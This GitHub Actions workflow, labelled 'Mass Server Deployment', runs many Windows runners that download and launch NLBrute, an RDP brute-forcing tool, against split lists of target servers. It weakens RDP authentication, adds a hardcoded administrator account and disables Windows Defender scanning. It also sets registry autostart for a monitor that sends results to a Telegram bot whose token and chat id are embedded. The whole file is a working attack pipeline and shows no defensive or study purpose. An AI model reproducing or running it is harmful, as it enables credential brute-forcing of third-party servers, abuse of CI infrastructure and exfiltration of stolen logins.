name: Mass Server Deployment (Dynamic Matrix)

on:
  workflow_dispatch:
    inputs:
      total_servers:
        description: 'How many servers to launch? (e.g. 10, 20)'
        required: true
        default: '10'

jobs:
  # JOB 1: Calculates the range
  setup:
    runs-on: ubuntu-latest
    outputs:
      server_ids: ${{ steps.set-ids.outputs.server_ids }}
    steps:
      - name: Generate Server ID Array
        id: set-ids
        shell: bash
        run: |
          TOTAL=${{ github.event.inputs.total_servers }}
          IDS=$(python3 -c "import json; print(json.dumps(list(range(1, int('$TOTAL') + 1))))")
          echo "server_ids=$IDS" >> $GITHUB_OUTPUT
          echo "Generated IDs: $IDS"

  # JOB 2: Performs the actual deployment
  deploy:
    needs: setup
    strategy:
      matrix:
        server_id: ${{ fromJSON(needs.setup.outputs.server_ids) }}
      fail-fast: false

    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Checkout Repo
        uses: actions/checkout@v4

      - name: 2. Setup Workspace
        shell: powershell
        run: |
          $maxServers = [int]${{ github.event.inputs.total_servers }}
          $currentId = ${{ matrix.server_id }}
          $workDir = "C:\target_app"
          $tempDir = "C:\split_data"

          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
          if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue }
          New-Item -ItemType Directory -Path $workDir -Force | Out-Null
          New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
          
          echo "SERVER_ID=$currentId" >> $env:GITHUB_ENV
          echo "MAX_SERVERS=$maxServers" >> $env:GITHUB_ENV
          echo "WORK_DIR=$workDir" >> $env:GITHUB_ENV
          echo "TEMP_DIR=$tempDir" >> $env:GITHUB_ENV
          
          Write-Host "Initializing Server ID: $currentId" -ForegroundColor Cyan

      - name: 3. Split servers.txt
        shell: powershell
        run: |
          $maxServers = [int]$env:MAX_SERVERS
          $currentId = [int]$env:SERVER_ID
          $inputFile = "${{ github.workspace }}\servers.txt" 
          $outputFile = "$($env:TEMP_DIR)\servers.txt"

          if (!(Test-Path $inputFile)) { exit 1 }

          $allLines = Get-Content $inputFile | Where-Object { $_.Trim() -ne "" }
          $totalLines = $allLines.Count
          if ($totalLines -eq 0) { exit 1 }

          $linesPerServer = [Math]::Floor($totalLines / $maxServers)
          $startIndex = ($currentId - 1) * $linesPerServer
          $countToTake = if ($currentId -eq $maxServers) { $totalLines - $startIndex } else { $linesPerServer }

          $serverLines = $allLines | Select-Object -Skip $startIndex -First $countToTake
          if ($null -eq $serverLines -or $serverLines.Count -eq 0) { exit 1 }

          $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
          Write-Host "Split file saved to: $outputFile" -ForegroundColor Green

      - name: 4. Enable RDP & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 5. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
          net user runneradmin P@ssw0rd1qazXSW@#

      - name: 6. Install & Connect Tailscale VPN
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          Start-Sleep -Seconds 5
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
          Start-Sleep -Seconds 8
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          
          echo "TAILSCALE_IP=$ts_ip" >> $env:GITHUB_ENV
          Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow

      - name: 7. Deploy App & Setup Autostart
        shell: powershell
        run: |
          # 1. Disable Security
          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableIOAVProtection $true
          Set-MpPreference -DisableBehaviorMonitoring $true
          Set-MpPreference -DisableScriptScanning $true

          # 2. Download Files
          $filesToDownload = @(
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z01",
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z02",
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z03",
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.zip"
          )

          Write-Host "Downloading files..." -ForegroundColor Yellow
          foreach ($url in $filesToDownload) {
              $fileName = Split-Path $url -Leaf
              Invoke-WebRequest -Uri $url -OutFile "$($env:WORK_DIR)\$fileName"
          }

          # 3. Extraction
          Write-Host "Starting Extraction..." -ForegroundColor Cyan
          $maxIterations = 5
          $iteration = 0
          $foundZip = $true

          while ($foundZip -and $iteration -lt $maxIterations) {
              $iteration++
              $zips = Get-ChildItem -Path $env:WORK_DIR -Filter "*.zip" -Recurse
              if ($zips.Count -eq 0) { $foundZip = $false } 
              else {
                  foreach ($zip in $zips) {
                      $targetFolder = $zip.DirectoryName
                      & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
                      Start-Sleep -Seconds 3
                  }
                  $foundZip = $true 
              }
          }

          # 4. Aggressive Injection
          Write-Host "Locating application files to inject split servers.txt..." -ForegroundColor Cyan
          $targetExe1 = "NLBrute_Manager.exe"
          $targetExe2 = "good.txt-monitor.exe"
          $splitFileSource = "$($env:TEMP_DIR)\servers.txt"

          $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
          $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

          function Force-Inject-Servers($exeFile, $sourceFile) {
              if ($exeFile) {
                  $exeDir = $exeFile.DirectoryName
                  $destinationFile = Join-Path $exeDir "servers.txt"
                  if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
                  Copy-Item -Path $sourceFile -Destination $destinationFile -Force
                  Write-Host "Injected split file into $exeDir" -ForegroundColor Green
              }
          }

          Force-Inject-Servers -exeFile $exeFile1 -sourceFile $splitFileSource
          Force-Inject-Servers -exeFile $exeFile2 -sourceFile $splitFileSource

          # 5. Registry & Autostart Setup
          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

          # APP 1 Setup
          if ($exeFile1) {
              $exePath1 = $exeFile1.FullName
              $exeDir1 = Split-Path $exePath1 -Parent
              $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
              $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
              $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
              Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
          }

          # APP 2 Setup
          if ($exeFile2) {
              $exePath2 = $exeFile2.FullName
              $exeDir2 = Split-Path $exePath2 -Parent
              $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
              $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
          }

      - name: 8. Generate Deployment Summary
        if: always()
        shell: powershell
        run: |
          $ip = $env:TAILSCALE_IP
          if ($null -eq $ip) { $ip = "N/A" }
          
          # Fixed: Using direct string interpolation for the IP
          $summary = "### 🚀 Server ${{ matrix.server_id }} Status`n"
          $summary += "| Metric | Value |`n"
          $summary += "| :--- | :--- |`n"
          $summary += "| **Tailscale IP** | $ip |`n"
          $summary += "| **Status** | Deployed |`n"
          $summary += "| **User** | NvdAdmin |`n"
          $summary += "| **Password** | P@ssw0rd1qazXSW@# |`n"
          $summary += "---`n"
          
          $summary | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Encoding utf8 -Append
          Write-Host "Summary updated for Server ${{ matrix.server_id }}" -ForegroundColor Cyan

      - name: 9. Keep Server Alive (6 Hours)
        run: |
          for ($i = 1; $i -le 360; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[Server ${{ matrix.server_id }}] Running..."
          }
